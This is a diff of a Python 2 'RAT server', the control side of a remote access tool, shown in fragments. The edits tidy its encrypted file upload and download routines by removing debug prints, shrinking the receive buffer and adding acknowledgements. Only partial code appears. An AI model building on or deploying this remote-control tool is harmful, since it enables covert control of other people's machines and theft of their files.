@@ -1,16 +1,14 @@
 #!/usr/bin/env python
 
-
 import argparse
 import readline
 import socket
 import sys
 import threading
 import os
-import struct
+
 
 from core.crypto import encrypt, decrypt, diffiehellman
-from core import filesock
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -141,50 +139,35 @@ class Server(threading.Thread):
         fsize = os.path.getsize(path)
         if os.path.isfile(path):
             try:
-                print("send upload")
                 self.send_client('upload', self.current_client)
-                # print("send filesize")
-                # strfsize = str(fsize)
-                # self.send_client(strfsize, self.current_client)
-                print("send fname")
                 self.send_client(fname, self.current_client)
-                print("send data")
-                sendfile = open(path,'r')
+                sendfile = open(path, 'r')
                 data = sendfile.read(int(fsize))
                 self.send_client(data, self.current_client)
-                print data
-
+                self.recv_client(self.current_client)
             except IOError:
                 print('Error: Permission denied.')
         else:
             print('Error: File not found.')
 
     def download(self, client):
-        path = raw_input('Int client\'s file path: ')
+        path = raw_input('Intput client\'s file path: ')
         fname = os.path.basename(path)
-        #send remote file path
+        # send remote file path
         self.send_client('download', self.current_client)
         print("send path")
         self.send_client(path, self.current_client)
-        #recv file
-        str="@server"
-        nname = str+fname
+        # recv file
+        str = "@server"
+        nname = str + fname
         rfile = open(nname, 'w')
-        print("try to recv")
         try:
-            recv_data = self.current_client.conn.recv(40960000)
-            print ('1')
+            recv_data = self.current_client.conn.recv(4096)
             dedata = decrypt(recv_data, self.current_client.dhkey)
-            print('2')
             rfile.write(dedata)
-            print('3')
-
+            self.recv_client(self.current_client)
         except Exception as e:
             print 'Error: {}'.format(e)
-
-
-
-
 
 
 class ClientConnection():
@@ -193,6 +176,7 @@ class ClientConnection():
         self.addr = addr
         self.dhkey = dhkey
         self.uid = uid
+
 
 def get_parser():
     parser = argparse.ArgumentParser(description='RAT server')
@@ -261,7 +245,6 @@ def main():
         #     server.upload(server.current_client)
         # if cmd == 'download':
         #     server.download()
-
 
         if cmd in server_commands:
             server_commands[cmd](action)
